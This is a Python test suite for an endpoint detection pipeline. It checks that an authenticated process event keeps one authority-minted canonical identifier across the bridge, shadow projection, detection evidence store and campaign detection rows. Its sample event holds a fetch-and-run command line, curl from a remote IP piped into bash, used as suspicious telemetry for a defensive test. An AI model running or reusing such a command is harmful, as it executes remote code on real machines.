"""R4 · END-TO-END PROOF · new evidence resolves by the PRIMARY identifier.

This is the acceptance assertion the identifier repair exists to satisfy:
one authenticated event goes through the REAL bridge (canonical evidence
→ shadow projection → detection fabric → campaign detection row), and
every plane that references it must name the SAME identifier — the one
the authority minted.

Before the repair, the detection plane re-derived `cev_<raw_id>_pl` while
the evidence authority stored `cev_<raw>_<generation>`, so the primary
join always missed and only the `raw_event_id` fallback worked.
"""
from __future__ import annotations

import asyncio
import json
import os
import sys
import uuid

from motor.motor_asyncio import AsyncIOMotorClient

sys.path.insert(0, "/app/backend")

from edr_plane import canonical_bridge as cb                    # noqa: E402
from edr_plane import evidence_resolution as er                 # noqa: E402
from edr_plane import raw_events as raw                         # noqa: E402

TENANT = "ten_c5_e2e"
ENDPOINT = "ep_c5_e2e"
EVENT = {"activity": "PROCESS", "collection_method": "PROC_POLL",
         "sensor_version": "0.1.0", "observed_at": "2026-06-01T10:00:00Z",
         "pid": 7331, "ppid": 1, "image": "curl",
         "image_path": "/usr/bin/curl",
         "command_line": "curl http://198.51.100.9/p.sh | bash",
         "user": "root", "start_ticks": 4242,
         "parent_lookup_state": "OBSERVED", "parent_image": "bash"}


def _run(fn):
    def wrapper():
        asyncio.run(_scoped(fn))
    wrapper.__name__ = fn.__name__
    wrapper.__doc__ = fn.__doc__
    return wrapper


async def _scoped(fn):
    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
    name = f"c5_e2e_{uuid.uuid4().hex[:10]}"
    db = client[name]
    payload = json.dumps(EVENT)
    event = raw.RawEndpointEvent.build(
        tenant_id=TENANT, source=ENDPOINT, payload=payload,
        source_kind="sensor", sensor_version="0.1.0",
        endpoint_ref=ENDPOINT, trust_state="AUTHENTICATED")
    await raw.append(db, event)
    result = await cb.bridge(
        db, raw_id=event.raw_id, tenant_id=TENANT, payload=payload,
        endpoint_id=ENDPOINT, hostname="host-c5",
        authentication={"authenticated_endpoint_id": ENDPOINT},
        source_kind="sensor", sensor_version="0.1.0",
        nivx_received_at=event.ingest_time)
    try:
        await fn(db, event.raw_id, result)
    finally:
        await client.drop_database(name)
        client.close()


@_run
async def test_the_bridge_mints_the_authority_identifier(db, raw_id, result):
    assert result["canonicalized"] is True
    assert result["canonical_event_id"] == cb.canonical_event_id(raw_id, 0)


@_run
async def test_the_shadow_projection_stores_the_authority_identifier(
        db, raw_id, result):
    obs = await db["v2_shadow_observations"].find_one({"tenant_id": TENANT})
    assert obs["canonical_event_id"] == cb.canonical_event_id(raw_id, 0)


@_run
async def test_the_raw_event_ledger_agrees_with_the_authority(
        db, raw_id, result):
    doc = await raw.get(db, tenant_id=TENANT, raw_id=raw_id)
    ids = {d.get("event_id") for d in doc["derivations"] if d.get("event_id")}
    assert ids == {cb.canonical_event_id(raw_id, 0)}


@_run
async def test_the_detection_plane_no_longer_mints_a_second_identity(
        db, raw_id, result):
    # `xdr_canonical_evidence` is written by the DETECTION pipeline. It
    # used to hold the `_pl` form for the same real event, which is the
    # duplicate authority B1 exists to prevent.
    rows = await db["xdr_canonical_evidence"].find(
        {"tenant_id": TENANT}).to_list(length=50)
    ids = {r.get("event_id") for r in rows if r.get("event_id")}
    assert ids, "the detection pipeline recorded no canonical evidence"
    assert ids == {cb.canonical_event_id(raw_id, 0)}
    assert not any(str(i).endswith("_pl") for i in ids)


@_run
async def test_a_detection_reference_resolves_by_the_primary_reference(
        db, raw_id, result):
    detection_reference = cb.canonical_event_id(raw_id, 0)
    out = await er.resolve(db, tenant_id=TENANT,
                           canonical_event_id=detection_reference,
                           raw_event_id=raw_id)
    assert out["resolved_via"] == er.PRIMARY
    assert out["is_fallback"] is False
    assert out["canonical_event_id_form"] == er.FORM_AUTHORITY


@_run
async def test_the_campaign_detection_row_carries_the_authority_id(
        db, raw_id, result):
    from detection_content.xdr_incident import _campaign_detection
    canonical = cb.parse(json.dumps(EVENT))
    canonical["event_id"] = cb.canonical_event_id(raw_id, 0)
    canonical["raw_ref"] = {"raw_id": raw_id}
    row = _campaign_detection(canonical, None, {"label": "SUSPICIOUS",
                                                "score": 40},
                              raw_id, "2026-06-01T10:00:01Z")
    assert row["canonical_event_id"] == cb.canonical_event_id(raw_id, 0)
    assert row["raw_event_id"] == raw_id
    out = await er.resolve(db, tenant_id=TENANT,
                           canonical_event_id=row["canonical_event_id"],
                           raw_event_id=row["raw_event_id"])
    assert out["resolved_via"] == er.PRIMARY
